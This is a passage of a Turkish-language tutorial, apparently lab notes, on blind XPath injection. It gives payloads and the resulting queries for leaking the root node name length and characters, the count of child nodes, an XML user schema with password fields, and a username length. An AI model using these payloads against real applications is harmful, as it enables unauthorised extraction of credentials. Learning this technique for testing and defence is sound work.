#### Bir Node'un Adının Uzunluğunu Çıkarma

**Root node**’un **name length**’ini sızdırmak için aşağıdaki **payload**’ı kullanabiliriz:

```
invalid' or string-length(name(/*[1]))=1 and '1'='1
```

Bu, şu **XPath query**’nin oluşmasına neden olur:

```xpath
/users/user[username='invalid' or string-length(name(/*[1]))=1 and '1'='1']
```


Sorgu `/*[1]`, **root element node**’u seçer.

Sağladığımız **username (invalid)** mevcut değildir, ancak `'1'='1'` ifadesi **universally true** olduğundan, sorgu yalnızca `string-length(name(/*[1]))=1` koşulu **true** olduğunda veri döndürür.

Bu, **root element node**’un isminin uzunluğunun **1** olduğunu gösterir. Ancak, bizim durumumuzda sorgu herhangi bir veri döndürmez.

![Pasted image 20250213135510.png](/img/user/Pasted%20image%2020250213135510.png)

Bu durumda, **1 olarak tahmin ettiğimiz uzunluk yanlış** çıktı.

Şimdi, **doğru değeri bulana kadar** uzunluğu arttırmamız gerekiyor. Bizim senaryomuzda, **doğru uzunluk 5** olarak bulunmuştur.


![Pasted image 20250213135648 1.png](/img/user/Pasted%20image%2020250213135648%201.png)

Böylece, **root node**’un adının uzunluğunu **5** olarak başarılı bir şekilde belirledik.

**Not:** Aramayı hızlandırmak için **<, <=, >, >=** gibi diğer operatörleri kullanabiliriz.


#### Exfiltrating a Node's Name

Artık **node**’un adının uzunluğunu bildiğimize göre, adını **karakter karakter** sızdırabiliriz.

Bunun için aşağıdaki **payload**’ı kullanabiliriz:

```
invalid' or substring(name(/*[1]),1,1)='a' and '1'='1
```

Bu, şu **XPath query**’nin oluşmasına neden olur:

```xpath
/users/user[username='invalid' or substring(name(/*[1]),1,1)='a' and '1'='1']
```

Yukarıdaki query, yalnızca root node'un adının ilk karakteri a'ya eşitse veri döndürür, ancak durum böyle değildir:

![Pasted image 20250213140032.png](/img/user/Pasted%20image%2020250213140032.png)

Bizim durumumuzda "u" olan doğru karakteri bulana kadar tüm olası karakterleri yinelememiz gerekir:

![Pasted image 20250213140158.png](/img/user/Pasted%20image%2020250213140158.png)

**Root node**’un adının ilk karakterini başarıyla sızdırdık.

Şimdi, ikinci karakteri sızdırmak için aşağıdaki **payload**’ı kullanabiliriz:

```
invalid' or substring(name(/*[1]),2,1)='a' and '1'='1
```

Burada, **doğru karakteri bulana kadar** tüm olasılıkları denememiz gerekir.

Bu işlemi, önceki adımda belirlediğimiz uzunluğa ulaşana kadar tekrar edersek, **root node**’un tam adını **users** olarak sızdırabiliriz.


#### Exfiltrating the Number of Child Nodes

Verilen bir **node** için **child node** sayısını belirlemek amacıyla, **count()** fonksiyonunu şu şekilde bir **payload** içinde kullanabiliriz:

```
invalid' or count(/users/*)=1 and '1'='1
```

Bu, şu **XPath query**’nin oluşmasına neden olur:

```xpath
/users/user[username='invalid' or count(/users/*)=1 and '1'='1']
```

Bu sorgu, **users node**’unun **child node** sayısını başarılı bir şekilde bulduysak veri döndürür. Bizim durumumuzda, **child node** sayısı **2**'dir.

![Pasted image 20250213141043.png](/img/user/Pasted%20image%2020250213141043.png)

Şimdi, önceki adıma geri dönüp **users node**’unun ilk **child**'ını `/users/*[1]` ile hedefleyebiliriz. Adın uzunluğundan başlayarak, ardından ismi sızdırabiliriz. Bu adımı, **maximum depth**'e ulaşana kadar tekrar etmemiz gerekir. Ayrıca, **siblings**'i hedeflemek için pozisyonu artırarak adresleme yapabiliriz. Örneğin, **users node**’unun ikinci **child**'ını `/users/*[2]` ile hedefleyebiliriz.

Bu şekilde, **XML schema**’yı iteratif olarak sızdırabiliriz. Bizim durumumuzda, bunu yaparak şu **schema**’yı açığa çıkardık:

```xml
<users>
	<user>
		<username>???</username>
		<password>???</password>
		<desc>???</desc>
	</user>
	<user>
		<username>???</username>
		<password>???</password>
		<desc>???</desc>
	</user>
</users>
```


#### Exfiltrating Data

Artık **XML schema**'yı bildiğimize göre, istediğimiz veriyi sızdırmak için hedeflenmiş bir **payload** enjekte edebiliriz. Önceki adımlarda kullandığımız aynı metodolojiyi tekrar kullanabiliriz.

**Username**'ı sızdırmaya başlamadan önce, önce **username**'in uzunluğunu belirlememiz gerekir. Bunun için şu **payload**'ı kullanabiliriz:

```
invalid' or string-length(/users/user[1]/username)=1 and '1'='1
```

Bu, şu **XPath query**'nin oluşmasına neden olur:

```xpath
/users/user[username='invalid' or string-length(/users/user[1]/username)=1 and '1'='1']
```

